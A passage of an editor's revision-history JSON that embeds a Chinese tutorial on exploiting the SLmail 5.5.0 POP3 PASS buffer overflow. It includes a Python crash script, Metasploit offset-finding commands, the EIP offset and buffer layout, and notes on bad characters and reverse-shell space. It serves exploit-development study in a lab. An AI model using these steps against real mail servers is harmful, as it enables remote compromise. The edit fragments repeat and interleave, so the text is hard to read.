,3055,""]],[2614,2614],[3055,3055]]],[1576233781998,[null,[[1,2614,"。改python脚本，将这个输入到buffer中，"],[1,2648,"\r"],[-1,2673,"end3py\n\n![23]($res/23.PNG)"],[1,2707,"d3py"],[-1,2707,"39694438`"],[1,2718,"![23"],[1,2831,"`"],[-1,2831,""],[1,2865,"("],[-1,2865,"`"],[1,3030,"$res/23.PNG)\n\n39694438\n\n\n"],[-1,3030,""]],[3055,3055],[2614,2614]]],[1576233776687,["whale@Whale",[[1,3030,"说明430字节的空余空间足够shellcode使用。"]],[3030,3030],[3056,3056]]],[1576233778453,["whale@Whale",[[1,3030,"，"]],[3030,3030],[3031,3031]]]]],["4d9bd88e-d182-4933-9188-660a6291887c",1576239134034,"缓冲区溢出案例与exp开发流程\n===\n- bug是怎么找到的?\n- 你怎么知道x比特在y命令，可以使应用程序崩溃造成缓冲区溢出漏洞？\n\n有三种方法：\n1. 如果有源代码，阅读源码是最简单的寻找bug的方式。\n2. 逆向工程\n3. fuzzing\n\n---\nfuzzing 是一种向应用程序发送构造的数据，然后期盼程序崩溃。\n程序崩溃说明程序没有对输入做正确的过滤。\n## 漏洞历史\n下面讲一下在slmail 5.5.0 邮件服务软件上的知名缓冲区溢出漏洞。\n在2005年发现，pop3 pass命令，在用户登陆的时候，有bof漏洞。攻击者无需知道\n任何口令即可引发bof漏洞。\n该软件未使用DEP或者ASLR编译，使得漏洞利用过程更加简单，我们不必绕过这些内部安全机制。\n## DEP和ASLR\n这是微软的内存保护机制。\nDEP是一系列硬件、软件技术，执行额外的内存检查，防止恶意代码在程序上运行。\nDEP主要的好处是当发生异常时，防止代码从数据区执行。\nASLR打乱载入应用程序、动态链接库时候的基地址（base address)\n## 与pop3协议通信\n我们选择slmail作为案例的原因是，与纯文本pop3协议通信十分简单。\n我们可以使用netcat与pop3服务器进行通信。\n\nhttps://slmail.software.informer.com/5.5/\n安装exe到windows，重启后，windows开放了pop3-110端口 \n\n![16]($res/16.PNG)\n\n## 写一个python脚本\n这个脚本的作用很简单，和nc起到的作用一样。为什么要写这个脚本呢?因为根据这个脚本稍作修改，就可以改为fuzzer脚本，使得应用程序崩溃。\n![15]($res/15.PNG)\n\n[https://github.com/Whale3070/ctf-coding/blob/master/send.py](https://github.com/Whale3070/ctf-coding/blob/master/send.py)\n\n[https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py](https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py)\n\n## immunity debugger\n![18]($res/18.PNG)\n\n左上 --指令面板\n\n右上 --寄存器面板\n\n左下 --内存转储面板\n\n右下 --堆栈面板\n\n---\nfile -- attach --SLmail\n![17]($res/17.PNG)\n\n挂载后，点击下图的开始按钮，运行程序\n![20]($res/20.PNG)\n\n运行[fuzzer.py](https://github.com/Whale3070/ctf-coding/blob/master/fuzzer.py)，使程序崩溃，造成了缓冲区溢出\n\n![19]($res/19.PNG)\n\n## 定位缓冲区大小\n定位缓冲区大小，当输入2500个a，程序运行正常；输入2600个a时候，就会报错。\n```\n#!/usr/bin/python\nimport socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nbuffer= 'a' * 2700\ntry:\n\tprint \"\\nSending evil buffer...\"\n\ts.connect(('192.168.1.102',110)) # connect to IP, POP3 port\n\tdata = s.recv(1024) # receive banner\n\tprint data # print banner\n\t\n\ts.send('USER test' +'\\r\\n') # send username \"test\"\n\tdata = s.recv(1024) # receive reply\n\tprint data # print reply\n\t\n\ts.send('PASS' + buffer + '\\r\\n') # send password \"test\"\n\tdata = s.recv(1024)\n\tprint data # print reply\n\t\n\ts.close() # close socket\n\tprint \"\\nDone!\"\nexcept:\n\tprint \"Could not connect to POP3!\"\n```\n## 控制eip\n\n控制eip寄存器是exp开发流程中关键的有，eip寄存器就像驾驭马的辔头一样，控制缰绳就让应用程序前进，\n拉着缰绳就能让它改变前进方向。所以我们使用4个A在buffer(缓冲区)中覆盖了EIP，这里有两个常见的方法：\n### 二叉树分析\n将2700个A修改为，发送1350A和1350个B，如果EIP被B所覆盖，我们知道了4比特存在于buffer的第二部分。\n接下来，修改1350个B为675个B和675个C，然后再一次发送buffer。\n如果EIP被C覆盖，我们知道了4bit存在于2000-2700比特范围之间。\n我们继续将buffer二分直到我们知道了准确的覆盖EIP的4bit。\n从数学上来说，这将在7次之内找到。\n### 发送一个特殊的字符串(使用msf）\n最快的方式是发送一个特殊的字符，来确认覆盖EIP的范围，然后在buffer中查找这个字符。\n\n**patter_create.rb**\n\n是一个ruby工具，来创建和定位这样的buffer，并且可以在msf中找到它。\n使用方法：\n```\nlocate pattern_create\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700\n```\n![21]($res/21.PNG)\n\n复制生成的字符串，修改[send.py](https://github.com/Whale3070/ctf-coding/blob/master/send.py)，将字符串作为pass密码发送，而不是2700个A，注意下一次程序崩溃时，ESP和EIP寄存器中的值\n\n![22]($res/22.PNG)\n\n执行send3py\n\n![23]($res/23.PNG)注意弹框的地址`39694438`\n\n```\nlocate pattern_offset.rb\n/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q 39694438\n\n[*] Exact match at offset 2606\n```\n于是得知了offset为2606\n\n## 检查buffer，准备执行shellcode\n知道EIP地址之后\n\n![24]($res/24.PNG)\n修改buffer，`string= \"A\"* 2606+ \"B\"*4 + \"C\"*(3500-2606-4)`\n\n将2700字节的buffer字符串修改为共3500字节，成功覆盖，说明430字节的空余空间足够shellcode使用。",[[1576239081115,["whale@Whale",[[1,3057,"\n\n"]],[3057,3057],[3058,3058]]],[1576239081287,["whale@Whale",[[1,3059,"\n"]],[3058,3058],[3059,3059]]],[1576239081579,["whale@Whale",[[1,3059,"buffer中，有些字符被认为是“坏”的，不允许使用。一个通用坏字符案例是0x00，这个字符在\r\ncopy命令执行时，当遇到第一个0x00，会终止字符串。\r\n\r\n0x0D同样是一个坏字符，它意味着密码已经输入完成了。\r\n\r\n一个经验丰富的exp作者，知道减产所有坏字符，以避免未来可能出现的问题。\r\n最简单的方法是发送所有可能的字符，从0x00到0xff作为buffer的一部分，然后查看这些字符串是如何被应用程序\r\n所处理的。"]],[3059,3059],[3273,3273]]],[1576239086789,["whale@Whale",[[-1,3106,"\r\n"],[-1,3136,"\r"],[-1,3138,"\r"],[-1,3167,"\r"],[-1,3169,"\r"],[-1,3207,"\r"],[-1,3266,"\r"]],[3106,3106],[3106,3106]]],[1576239093367,["whale@Whale",[[-1,3180,"减产"]],[3182,3182],[3180,3180]]],[1576239096183,["whale@Whale",[[1,3180,"检查"]],[3180,3180],[3182,3182]]],[1576239188597,["whale@Whale",[[1,2998,"\n"]],[2997,2997],[2998,2998]]],[1576239188953,["whale@Whale",[[1,2999,"\n"]],[2998,2998],[2999,2999]]],[1576239189283,["whale@Whale",[[1,2999,"## 检查坏字符"]],[2999,2999],[3007,3007]]],[1576239204644,["whale@Whale",[[-1,2885,"## 检查buffer，准备执行shellcode\n知道EIP地址之后\n\n![24]($res/24.PNG)\n修改buffer，`string= \"A\"* 2606+ \"B\"*4 + \"C\"*(3500-2606-4)`\n\n\n## 检查坏字符\n将2700字节的buffer字符串修改为共3500字节，成功覆盖，说明430字节的空余空间足够shellcode使用。\n\nbuffer中，有些字符被认为是“坏”的，不允许使用。一个通用坏字符案例是0x00，这个字符在copy命令执行时，当遇到第一个0x00，会终止字符串。\n\n0x0D同样是一个坏字符，它意味着密码已经输入完成了。\n\n一个经验丰富的exp作者，知道检查所有坏字符，以避免未来可能出现的问题。\n最简单的方法是发送所有可能的字符，从0x00到0xff作为buffer的一部分，然后查看这些字符串是如何被应用程序\n所处理的。"]],[2885,3275],[2885,2885]]],[1576239221089,["whale@Whale",[[1,2885,"## 检查buffer，准备执行shellcode\n知道EIP地址之后\n\n![24]($res/24.PNG)\n修改buffer，`string= \"A\"* 2606+ \"B\"*4 + \"C\"*(3500-2606-4)`\n\n\n## 检查坏字符\n将2700字节的buffer字符串修改为共3500字节，成功覆盖，说明430字节的空余空间足够shellcode使用。\n\nbuffer中，有些字符被认为是“坏”的，不允许使用。一个通用坏字符案例是0x00，这个字符在copy命令执行时，当遇到第一个0x00，会终止字符串。\n\n0x0D同样是一个坏字符，它意味着密码已经输入完成了。\n\n一个经验丰富的exp作者，知道检查所有坏字符，以避免未来可能出现的问题。\n最简单的方法是发送所有可能的字符，从0x00到0xff作为buffer的一部分，然后查看这些字符串是如何被应用程序\n所处理的。"]],[2885,2885],[3275,3275]]],[1576239715227,["whale@Whale",[[-1,2999,"## 检查坏字符\n将2700字节的buffer字符串修改为共3500字节，成功覆盖，说明430字节的空余空间足够shellcode使用。\n\nbuffer中，有些字符被认为是“坏”的，不允许使用。一个通用坏字符案例是0x00，这个字符在copy命令执行时，当遇到第一个0x00，会终止字符串。\n\n0x0D同样是一个坏字符，它意味着密码已经输入完成了。\n\n一个经验丰富的exp作者，知道检查所有坏字符，以避免未来可能出现的问题。\n最简单的方法是发送所有可能的字符，从0x00到0xff作为buffer的一部分，然后查看这些字符串是如何被应用程序\n所处理的。\n"]],[2998,3275],[2998,2998]]],[1576239813787,["whale@Whale",[[1,2921,"## 检查buffer，准备执行shellcode\r\nmsf可以自动生成shellcode，标准的反弹shell的payload（有效载荷）需要大约350-400比特的空间。查看最后\r\n的crash，我们可以看到ESP寄存器直接指向了我们缓冲区的C地址，这看起来有足够的空间让我们放置shellcode。\r\n"]],[2921,2921],[3075,3075]]],[1576239834892,["whale@Whale",[[-1,2911,"知道EIP地址之后\n## 检查buffer，准备执行shellcode\r\n"],[-1,3012,"\r"],[-1,3073,"\r"]],[2884,2920],[2884,2884]]],[1576239846109,["whale@Whale",[[-1,2975,"\n"]],[2975,2975],[2975,2975]]],[1576239851193,["whale@Whale",[[-1,2971,"查看最后的crash，我们可以看到ESP寄存器直接指向了我们缓冲区的C地址，这看起来有足够的空间让我们放置shellcode。\n"]],[2971,3035],[2971,2971]]],[1576239855376,["whale@Whale",[[1,2972,"\n"]],[2971,2971],[2972,2972]]],[1576239857779,["whale@Whale",[[1,3048,"查看最后的crash，我们可以看到ESP寄存器直接指向了我们缓冲区的C地址，这看起来有足够的空间让我们放置shellcode。\n"]],[3048,3048],[3112,3112]]]]]]}